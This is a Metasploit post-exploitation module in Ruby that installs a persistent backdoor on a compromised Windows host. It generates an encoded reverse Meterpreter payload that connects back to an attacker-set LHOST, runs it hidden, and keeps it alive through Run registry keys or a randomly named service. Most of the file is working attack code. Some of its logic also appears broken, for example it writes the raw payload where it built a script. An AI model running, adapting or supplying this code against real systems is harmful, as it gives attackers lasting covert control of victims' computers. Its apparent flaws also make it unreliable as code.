##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::Services

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Persistent Payload Installer',
			'Description'   => %q{
				This module will install a payload that is executed during boot.
				It works by installing a payload that will be executed at user logon or
				system startup (depending on privilege and selected startup method).

				Using the MSF action will generate & transfer a reverse
				Meterpreter payload.

				Otherwise, the CUSTOM action will transfer a binary of your choosing
				to the remote host to be used as the payload.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Carlos Perez <carlos_perez[at]darkoperator.com>',
					'Merlyn drforbin Cousins <drforbin6[at]gmail.com>',
				],
			'Platform'      => [ 'win' ],
			'Actions'       =>
				[
					[	'MSF',
						{
							'Description' => 'Let Metasploit generate a Meterpeter payload.'
						}
					],
					[	'CUSTOM',
						{
							'Description' => 'Use a custom binary file as the payload.'
						}
					]
				],
			'DefaultAction' => 'MSF',
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptBool.new('HANDLER', [true, 'Start a multi/handler to receive the session.', true]),
				OptEnum.new('STARTUP', [true, 'Startup type for the payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
				OptString.new('PATH', [true, 'PATH to write payload', '%TEMP%']),
				# ACTION=MSF
				OptAddress.new('LHOST', [false, 'IP for Meterpeter payload to connect to.']),
				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
				OptInt.new('DELAY', [false, 'Delay (in seconds) at startup until Meterpreter tries to connect back.', 5]),
				OptInt.new('LPORT', [false, 'Port for Meterpeter payload to connect to.']),
				OptString.new('TEMPLATE', [false, 'Alternate Windows PE file to use as a template for Meterpreter.']),
				# ACTION=CUSTOM
				OptString.new('REXE', [false, 'Local path to the custom executable to use remotely.']),
				OptString.new('REXENAME',[false, 'The filename of the custom executable to use on the remote host.'])
			], self.class)

		register_advanced_options(
			[
				OptString.new('OPTIONS', [false, 'Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.']),
				OptString.new('ENCODER', [false, 'Encoder name to use for encoding.', 'x86/shikata_ga_nai']),
				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.', 5]),
			], self.class)
	end

	# Run method for when run command is issued
	#-------------------------------------------------------------------------------
	def run
		# Set vars
		rexe = datastore['REXE']
		rexename = datastore['REXENAME']
		lhost = datastore['LHOST']
		lport = datastore['LPORT']
		opts = datastore['OPTIONS']
		delay = datastore['DELAY']
		encoder = datastore['ENCODER']
		iterations = datastore['ITERATIONS']
		@clean_up_rc = ""
		host,port = session.session_host, session.session_port
		payload = "windows/meterpreter/reverse_tcp"
		path = datastore['PATH'] || expand_path("%TEMP%")

		# Check user input
		if action.name.upcase == 'MSF' or action.name.upcase == 'TEMPLATE'   # TEMPLATE - legacy
			action = 'MSF'
			print_status("Action: MSF (will generate a new payload for use)")

			if datastore['LHOST'].nil? or datastore['LHOST'].empty?
				print_error("Please set LHOST")
				return
			end

			if !datastore['LPORT'].between?(1,65535)
				print_error("Please set LPORT")
				return
			end

			# Check to see if the template file actually exists
			if datastore['TEMPLATE']
				if not ::File.exists?(datastore['TEMPLATE'])
					print_error "Template file doesn't exists"
					return
				else
					template_pe = datastore['TEMPLATE']
				end
			end

			# Set the 'correct' payload
			case datastore['PAYLOAD_TYPE']
				when /TCP/i
					payload = "windows/meterpreter/reverse_tcp"
				when /HTTP/i
					payload = "windows/meterpreter/reverse_http"
				when /HTTPS/i
					payload = "windows/meterpreter/reverse_https"
			end
		elsif action.name.upcase == 'CUSTOM' or action.name.upcase == 'REXE'   # REXE - legacy
			action.name = 'CUSTOM'
			print_status("Action: CUSTOM (using a custom binary)")

			if datastore['REXE'].nil? or datastore['REXE'].empty?
				print_error("Please set REXE")
				return
			end

			if not ::File.exist?(datastore['REXE'])
				print_error("REXE (#{datastore['REXE']}) doesn't exist!")
				return
			end

			if rexename.nil? or rexename.empty?
				rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
			end

			if not rexename =~ /\.exe$/
				rexename += '.exe'
			end
		else
			print_error("Unknwon ACTION (#{action.name.upcase})")
			return
		end

		# Start!
		print_status("Running module against #{sysinfo['Computer']}")

		# Create/load payload
		if action.name.upcase == 'MSF'
			pay = create_payload(payload, lhost, lport, opts = "")
			raw = pay_gen(pay,encoder, iterations)
			script = create_script(delay, template_pe, raw)
		else
			raw = create_payload_from_file(rexe)
		end

		script_on_target = write_to_target(raw, path, rexename)
		if not script_on_target
			print_error("Stopping...")
			return
		end

		# Start handler if set
		if datastore['HANDLER']
			if datastore['LHOST'] and datastore['LPORT']
				create_multihand(payload, lhost, lport)
			else
				print_error("Skipping multi/handler: LHOST/LPORT isn't set")
			end
		end

		# Initial execution of payload
		target_exec(script_on_target)

		case datastore['STARTUP']
			when /USER/i
				write_to_reg("HKCU",script_on_target)
			when /SYSTEM/i
				write_to_reg("HKLM",script_on_target)
			when /SERVICE/i
				install_as_service(script_on_target)
			end

		# Generate clean up file
		clean_rc = log_file()
		file_local_write(clean_rc,@clean_up_rc)
		print_status("Cleanup Meterpreter RC file: #{clean_rc}")

		report_note(:host => host,
			:type => "host.persistance.cleanup",
			:data => {
				:local_id => session.sid,
				:stype => session.type,
				:desc => session.info,
				:platform => session.platform,
				:via_payload => session.via_payload,
				:via_exploit => session.via_exploit,
				:created_at => Time.now.utc,
				:commands => @clean_up_rc
			}
		)
	end

	# Generate raw payload
	#-------------------------------------------------------------------------------
	def pay_gen(pay, encoder, iterations)
		raw = pay.generate
		if encoder
			if enc_compat(pay, encoder)
				print_status("Encoding with #{encoder}")
				enc = framework.encoders.create(encoder)
				(1..iterations).each do |i|
					print_status("\tRunning iteration #{i}")
					raw = enc.encode(raw, nil, nil, "Windows")
				end
			end
		end
		return raw
	end

	# Check if encoder specified is in the compatible ones
	#
	# Note: This should allow to adapt to new encoders if they appear with out having
	# to have a static whitelist.
	#-------------------------------------------------------------------------------
	def enc_compat(payload, encoder)
		compat = false
		payload.compatible_encoders.each do |e|
			if e[0] == encoder.strip
				compat = true
			end
		end
		return compat
	end

	# Create a payload given a name, lhost and lport, additional options
	#-------------------------------------------------------------------------------
	def create_payload(name, lhost, lport, opts = "")
		pay = session.framework.payloads.create(name)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not opts.empty?
			opts.split(",").each do |o|
				opt,val = o.split("=", 2)
				pay.datastore[opt] = val
			end
		end
		# Validate the options for the module
		pay.options.validate(pay.datastore)
		return pay

	end

	# Function for creating payload
	#-------------------------------------------------------------------------------
	def create_script(delay, altexe, raw)
		if not altexe.nil?
			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay, :template => altexe})
		else
			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay})
		end
		print_status("Payload is #{vbs.length} bytes long")
		return vbs
	end

	# Function for creating log folder and returning log path
	#-------------------------------------------------------------------------------
	def log_file(log_path = nil)
		#Get hostname
		host = session.sys.config.sysinfo["Computer"]

		# Create filename info to be appended to downloaded files
		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

		# Create a directory for the logs
		if log_path
			logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		else
			logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
		end

		# Create the log directory
		::FileUtils.mkdir_p(logs)

		#logfile name
		logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
		return logfile
	end

	# Function for writing payload to target host
	#-------------------------------------------------------------------------------
	def write_script_to_target(vbs)
		tempdir = session.fs.file.expand_path("%TEMP%")
		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		fd = session.fs.file.new(tempvbs, "wb")
		fd.write(vbs)
		fd.close
		print_good("Payload written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end

	# Method for checking if a listener for a given IP and port is present
	# will return true if a conflict exists and false if none is found
	#-------------------------------------------------------------------------------
	def check_for_listner(lhost, lport)
		conflict = false
		client.framework.jobs.each do |k,j|
			if j.name =~ / multi\/handler/
				current_id = j.jid
				current_lhost = j.ctx[0].datastore["LHOST"]
				current_lport = j.ctx[0].datastore["LPORT"]
				if lhost == current_lhost and lport == current_lport.to_i
					print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
					conflict = true
				end
			end
		end
		return conflict
	end

	# Starts a multi/handler session
	#-------------------------------------------------------------------------------
	def create_multihand(payload, lhost, lport)
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport
		if not check_for_listner(lhost,lport)
			# Set options for module
			mul = session.framework.exploits.create("multi/handler")
			mul.share_datastore(pay.datastore)
			mul.datastore['WORKSPACE'] = client.workspace
			mul.datastore['PAYLOAD'] = payload
			mul.datastore['EXITFUNC'] = 'thread'
			mul.datastore['ExitOnSession'] = false
			# Validate module options
			mul.options.validate(mul.datastore)
			# Execute showing output
			mul.exploit_simple(
					'Payload'     => mul.datastore['PAYLOAD'],
					'LocalInput'  => self.user_input,
					'LocalOutput' => self.user_output,
					'RunAsJob'    => true
				)
		else
			print_error("Could not start handler!")
			print_error("A job is listening on the same port")
		end
	end

	# Function to execute payload on target and return the PID of the process
	#-------------------------------------------------------------------------------
	def target_exec(script_on_target)
		print_status("Executing payload #{script_on_target}")
		proc = action.name.upcase == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
			session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
		print_good("Payload executed with PID #{proc.pid}")
		@clean_up_rc << "kill #{proc.pid}\n"
		return proc.pid
	end

	# Function to install payload in to the registry HKLM or HKCU
	#-------------------------------------------------------------------------------
	def write_to_reg(key,script_on_target)
		nam = Rex::Text.rand_text_alpha(rand(8)+8)
		print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		if(key)
			registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
			print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
		else
			print_error("Error: Failed to open the registry key for writing")
		end
	end

	# Function to install payload as a service
	#-------------------------------------------------------------------------------
	def install_as_service(script_on_target)
		if is_system? or is_admin?
			print_status("Installing as service")
			nam = Rex::Text.rand_text_alpha(rand(8)+8)
			print_status("Creating service #{nam}")
			action.name.upcase == 'MSF' ? service_create(nam, nam, "cscript \"#{script_on_target}\"") : \
				service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
			print_good("Service successfully created")
			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
		else
			print_error("Insufficient privileges to create service")
		end
	end

	# Function for writing executable to target host
	#-------------------------------------------------------------------------------
	def write_to_target(vbs, path, rexename="")
		tempdir = session.fs.file.expand_path(path)
		if rexename
			tempvbs = tempdir + "\\" + rexename
		else
			tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
		end

		if file? tempvbs
			print_warning("File #{tempvbs} already exists... Removing...")
			file_rm(tempvbs)
		end

		begin
			fd = session.fs.file.new(tempvbs, "wb")
			fd.write(vbs)
			fd.close
		rescue => e
			print_error("Couldn't write to #{tempvbs}")
			return nil
		end

		print_good("Payload written to #{tempvbs}")
		@clean_up_rc << "rm #{tempvbs}\n"
		return tempvbs
	end

	# Function to read in custom binary
	#-------------------------------------------------------------------------------
	def create_payload_from_file(exec)
		print_status("Using #{exec} as the payload")
		return ::IO.read(exec)
	end
end
